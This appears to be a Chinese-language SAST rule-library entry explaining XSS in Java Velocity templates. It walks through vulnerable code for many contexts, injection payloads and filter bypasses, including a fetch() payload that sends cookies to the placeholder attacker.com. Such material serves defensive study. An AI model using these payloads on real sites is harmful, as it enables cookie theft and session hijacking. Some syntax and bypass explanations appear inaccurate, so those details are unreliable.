# Java Velocity XSS漏洞 完整描述

> 来源：ChanziSAST 规则库语义规则提取（知识整理，含中文漏洞详解）。
> 规则 ID：`other_velocity_xss` · 类别：xss · 关键 sink：Template, merge
> 说明：原文为 cypher 语义查询（不可直接挂 semgrep），下方「知识正文」为规则自带的中文漏洞详解，
> 提取时未改写；配合 fortify-kingdom-reference 的定级指南与各语言 sink 手册使用。


## Java Velocity XSS漏洞 完整描述
Velocity作为Java生态主流的模板引擎，其XSS（跨站脚本）漏洞本质是：攻击者将包含恶意脚本（如`<script>`、`javascript:`伪协议）的不可信输入注入到Velocity模板渲染流程中，模板引擎未对输入做有效过滤/转义，最终将恶意脚本原样输出到前端页面，被浏览器解析执行，导致窃取用户Cookie、劫持会话、伪造操作等攻击。与通用XSS不同，Velocity XSS因模板语法特性、上下文变量处理方式、输出场景差异，呈现出多种特有触发场景，核心根源是「模板渲染时未对用户可控内容做上下文感知的转义」。

## 一、Velocity XSS漏洞的核心原理
Velocity的渲染逻辑是将上下文变量、静态模板内容拼接后输出，若用户输入的恶意脚本未被转义，会被直接嵌入到HTML/JS/CSS等前端代码中：
1. 攻击者构造含XSS脚本的输入（如`<script>alert(document.cookie)</script>`）；
2. 该输入被传入Velocity上下文或直接拼接进模板字符串；
3. 模板渲染时未对特殊字符（`<`、`>`、`"`、`'`、`&`）转义，恶意脚本随渲染结果输出到HTTP响应；
4. 前端浏览器解析响应内容时，将恶意脚本识别为合法代码并执行，触发XSS攻击。

### Velocity触发XSS的关键特性（漏洞基础）
1. **模板直接输出变量**：Velocity默认以「原样输出」方式渲染`$variable`，无自动HTML转义；
2. **多上下文输出场景**：变量可输出到HTML标签内容、标签属性、JS代码块、CSS样式等不同位置，不同位置的XSS触发条件不同；
3. **模板语法拼接风险**：若用户输入拼接进模板字符串（如`"<div>" + $userInput + "</div>"`），会放大XSS风险；
4. **Velocity工具类误用**：若未正确使用`EscapeTool`等转义工具，或转义不彻底，仍会遗留XSS漏洞；
5. **动态包含/渲染**：模板中动态包含用户可控内容（如`#parse($userInput)`），易导致XSS注入。

## 二、Velocity XSS漏洞的核心触发场景
### 场景1：基础型——变量直接输出到HTML标签内容（最常见）
开发者将用户可控的上下文变量直接在HTML标签内渲染，未做任何转义，是Velocity XSS最基础也最易触发的场景。

#### 示例代码（漏洞代码）：
```java
// 后端：将用户输入传入Velocity上下文
VelocityContext context = new VelocityContext();
String userName = request.getParameter("username"); // 可控输入，如传入<script>alert(1)</script>
context.put("username", userName);

// Velocity模板（user.vm）：直接输出变量到HTML标签内容
<div class="user-info">
    欢迎您：$username
</div>
```

#### 攻击利用方式：
攻击者构造`username=<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>`，模板渲染后输出的HTML为：
```html
<div class="user-info">
    欢迎您：<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>
</div>
```
浏览器解析时执行脚本，窃取当前用户Cookie并发送到攻击者服务器。

### 场景2：进阶型——变量输出到HTML标签属性
变量被渲染到HTML标签的属性中（如`href`、`src`、`onclick`、`value`），即使输入不含`<script>`，也可通过属性劫持触发XSS，且绕过方式更隐蔽。

#### 子场景2.1：普通属性（href/src）
##### 漏洞代码：
```java
// 后端：用户输入为链接地址
String link = request.getParameter("link");
context.put("link", link);

// 模板（link.vm）：变量输出到href属性
<a href="$link">点击跳转</a>
```
##### 攻击利用：
传入`link=javascript:alert(document.cookie)`，渲染后HTML为：
```html
<a href="javascript:alert(document.cookie)">点击跳转</a>
```
用户点击链接时执行脚本；或传入`link=" onclick="alert(1)" x="`，渲染后：
```html
<a href="" onclick="alert(1)" x="">点击跳转</a>
```
闭合属性引号并注入事件触发脚本。

#### 子场景2.2：事件属性（onclick/onload/onmouseover）
##### 漏洞代码：
```java
String callback = request.getParameter("callback");
context.put("callback", callback);

// 模板（button.vm）：变量输出到onclick属性
<button onclick="handleClick('$callback')">提交</button>
```
##### 攻击利用：
传入`callback=');alert(1);//`，渲染后：
```html
<button onclick="handleClick('');alert(1);//')">提交</button>
```
闭合函数参数引号，注入脚本并注释后续内容，点击按钮时执行`alert(1)`。

#### 子场景2.3：表单属性（value/placeholder）
##### 漏洞代码：
```java
String searchKey = request.getParameter("keyword");
context.put("keyword", searchKey);

// 模板（search.vm）：变量输出到input的value属性
<input type="text" name="search" value="$keyword" placeholder="请输入关键词">
```
##### 攻击利用：
传入`keyword=" onfocus="alert(1)" autofocus x="`，渲染后：
```html
<input type="text" name="search" value="" onfocus="alert(1)" autofocus x="" placeholder="请输入关键词">
```
利用`autofocus`自动触发`onfocus`事件，无需用户交互即可执行脚本。

### 场景3：高危型——变量输出到JS代码块/内联脚本
变量被渲染到`<script>`标签内、JS函数参数或内联脚本中，XSS危害更高（可直接操作DOM、调用前端API），且绕过方式更灵活。

#### 子场景3.1：JS代码块内直接输出
##### 漏洞代码：
```java
String userId = request.getParameter("uid");
context.put("uid", userId);

// 模板（script.vm）：变量输出到JS代码块
<script>
    var userId = "$uid";
    loadUserInfo(userId);
</script>
```
##### 攻击利用：
传入`uid=";alert(1);var a="`，渲染后JS代码：
```javascript
var userId = "";alert(1);var a="";
loadUserInfo(userId);
```
闭合字符串引号，注入独立脚本语句，页面加载时直接执行。

#### 子场景3.2：JS函数参数（动态调用）
##### 漏洞代码：
```java
String funcName = request.getParameter("func");
context.put("func", funcName);

// 模板（func.vm）：变量作为函数名调用
<script>
    $func(); // 动态执行函数
</script>
```
##### 攻击利用：
传入`func=alert(1)`，渲染后：
```javascript
alert(1)(); // 执行alert(1)
```
或传入`func=eval('document.body.innerHTML="<h1>hacked</h1>"')`，篡改页面内容。

### 场景4：模板语法拼接导致的XSS
开发者将用户输入直接拼接进模板字符串（而非通过上下文变量），即使变量转义，拼接过程仍会引入XSS风险。

#### 漏洞代码：
```java
// 后端：直接拼接用户输入到模板字符串
String userInput = request.getParameter("content");
String templateStr = "<div class='content'>" + userInput + "</div>"; // 拼接输入
VelocityEngine ve = new VelocityEngine();
StringWriter sw = new StringWriter();
ve.evaluate(context, sw, "test", templateStr); // 渲染拼接后的模板
response.getWriter().write(sw.toString());
```
#### 攻击利用：
传入`userInput=<img src=x onerror=alert(1)>`，拼接后的模板字符串直接包含恶意标签，渲染后输出到页面，触发`onerror`事件执行脚本。

### 场景5：Velocity指令/工具类误用导致的XSS
Velocity提供`#escape`、`EscapeTool`等转义工具，但因使用不当（如转义类型错误、漏转义），仍会触发XSS。

#### 子场景5.1：转义类型不匹配
##### 漏洞代码：
```java
// 后端：传入EscapeTool，但模板中用错转义类型
context.put("esc", new EscapeTool());
String userInput = request.getParameter("content");
context.put("content", userInput);

// 模板：对HTML场景使用URL转义（错误）
<div>$esc.url($content)</div>
```
##### 攻击利用：
传入`content=<script>alert(1)</script>`，`$esc.url()`仅转义URL特殊字符（如`&`、`=`），不会转义`<`/`>`，渲染后仍输出恶意脚本。

#### 子场景5.2：局部禁用转义
##### 漏洞代码：
```java
// 模板：开启全局转义，但局部禁用
#escape($esc.html)
    <div>$content</div> <!-- 正常转义 -->
    #unescape()
        <div>$content</div> <!-- 禁用转义，XSS漏洞 -->
    #escape($esc.html)
```
##### 攻击利用：
`#unescape()`块内的`$content`未被转义，传入恶意脚本即可触发XSS。

#### 子场景5.3：漏转义特殊字符
Velocity的`$esc.html()`默认转义`<`、`>`、`&`、`"`、`'`，但部分场景下若输入包含其他危险字符（如`/`、`\`、`+`），或编码后的字符（如`&#x3c;`），未做额外处理仍会触发XSS。

### 场景6：动态模板包含/解析导致的XSS
Velocity的`#parse`、`#include`指令可动态加载模板，若包含的模板路径/内容由用户控制，会引入XSS。

#### 子场景6.1：#parse加载用户可控模板
##### 漏洞代码：
```java
String tplName = request.getParameter("tpl");
context.put("tpl", tplName);

// 模板：动态解析用户指定的模板
#parse($tpl)
```
##### 攻击利用：
传入`tpl=../../tmp/malicious.vm`（路径遍历），加载包含`<script>alert(1)</script>`的恶意模板文件，渲染后输出脚本。

#### 子场景6.2：#include包含用户可控内容
##### 漏洞代码：
```java
String includePath = request.getParameter("path");
context.put("path", includePath);

// 模板：包含用户指定的文件内容
#include($path)
```
##### 攻击利用：
传入`path=/tmp/xss.txt`（文件内容为`<iframe src="javascript:alert(1)"></iframe>`），`#include`将文件内容原样输出，触发XSS。

### 场景7：多阶段渲染导致的XSS（嵌套渲染）
开发者先将用户输入渲染为中间模板内容，再将中间结果作为新模板二次渲染，即使单次渲染有转义，二次渲染可能导致转义失效。

#### 漏洞代码：
```java
// 第一次渲染：对输入做基础转义
String userInput = request.getParameter("content");
String tempTemplate = "Content: $esc.html($content)";
StringWriter tempSw = new StringWriter();
ve.evaluate(context, tempSw, "temp", tempTemplate);
String intermediate = tempSw.toString(); // 中间结果：Content: &lt;script&gt;alert(1)&lt;/script&gt;

// 第二次渲染：将中间结果作为模板（无转义）
StringWriter finalSw = new StringWriter();
ve.evaluate(context, finalSw, "final", intermediate);
response.getWriter().write(finalSw.toString());
```
#### 攻击利用：
若攻击者传入`content=$esc.unescapeHtml('&lt;script&gt;alert(1)&lt;/script&gt;')`，第一次渲染后中间结果包含`$esc.unescapeHtml(...)`，第二次渲染时执行该指令，还原`<script>`标签，触发XSS。

### 场景8：Velocity 2.x版本特性导致的XSS
Velocity 2.x新增「严格模式」等安全特性，但因版本适配问题，仍可能引入XSS：
1. **严格模式下未定义变量的输出**：2.x中未定义的变量默认输出`${variable}`，若用户可控制变量名，传入`variable=" onload=alert(1) x="`，输出的`${" onload=alert(1) x="}`会嵌入到HTML属性中，闭合引号触发XSS；
2. **2.x语法兼容问题**：如`$!{variable}`与`${variable}`的转义行为不一致，误用后导致漏转义。

## 三、Velocity XSS的类型分类（按触发方式）
### 1. 存储型XSS
用户输入的恶意脚本被存储到数据库/文件中（如用户昵称、评论内容），后续每次渲染该内容时都会触发XSS，影响所有访问该页面的用户。
- 示例：攻击者在评论框输入`<script>stealCookie()</script>`，评论被存储后，所有查看该评论的用户都会执行脚本。

### 2. 反射型XSS
恶意脚本通过URL参数等方式传入，仅在当前请求中渲染输出，仅影响触发该请求的用户。
- 示例：`http://example.com/user?username=<script>alert(1)</script>`，页面渲染`$username`时触发脚本。

### 3. DOM型XSS（Velocity间接触发）
Velocity渲染的内容作为前端DOM操作的数据源（如`document.getElementById("content").innerHTML = "$content"`），即使后端输出的内容有基础转义，前端DOM操作仍可能触发XSS。
- 示例：Velocity渲染`$content`为`&lt;script&gt;alert(1)&lt;/script&gt;`，但前端执行`innerHTML`赋值时，浏览器会解析HTML实体，还原`<script>`标签。

## 四、Velocity XSS的典型绕过方式
攻击者针对Velocity的转义规则、输出场景，常用以下方式绕过防护：
1. **HTML实体编码绕过**：传入`&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;`，部分转义工具未解码实体，渲染后被浏览器解析为`<script>`；
2. **大小写混淆**：传入`<ScRiPt>alert(1)</ScRiPt>`，若转义工具仅过滤小写标签，可绕过；
3. **事件属性变形**：传入`<img src=1 onerror=eval(atob('YWxlcnQoMSk='))>`，用Base64编码脚本内容，绕过关键字过滤；
4. **伪协议绕过**：`href=javascr&#105;pt:alert(1)`，用换行符（`&#10;`）拆分关键字，绕过字符过滤；
5. **多字符拼接**：传入`<scr<script>ipt>alert(1)</scr</script>ipt>`，部分过滤规则仅删除单次`<script>`，拼接后还原标签；
6. **利用Velocity变量拼接**：传入`var1=<scr&var2=ipt>alert(1)</scr&var3=ipt>`，模板中`$var1$var2$var3`拼接为完整脚本。

## 五、Velocity XSS的危害
1. **窃取用户敏感信息**：Cookie、Token、账号密码、个人信息；
2. **会话劫持**：利用窃取的Cookie登录用户账号，执行未授权操作；
3. **页面篡改**：注入恶意HTML/JS，篡改页面内容（如钓鱼链接、虚假公告）；
4. **恶意重定向**：注入`window.location.href="http://attacker.com"`，诱导用户访问钓鱼网站；
5. **蠕虫攻击**：利用XSS触发批量操作（如自动发布评论、转发内容），扩散攻击；
6. **结合其他漏洞**：XSS可作为跳板，配合CSRF、SQL注入等漏洞放大危害。

## 六、Velocity XSS与通用XSS的差异
1. **触发链路更长**：需经过Velocity模板解析、上下文变量传递、渲染输出等环节，漏洞定位更复杂；
2. **转义工具依赖**：需结合Velocity特有的`EscapeTool`、`#escape`指令，通用XSS过滤函数（如`HtmlUtils.htmlEscape`）需适配模板语法；
3. **多上下文适配**：Velocity变量可输出到HTML/JS/CSS等不同场景，需按输出位置选择对应转义方式，通用转义可能失效；
4. **模板指令风险**：`#parse`、`#include`等指令的动态使用，会引入通用XSS未覆盖的触发场景。

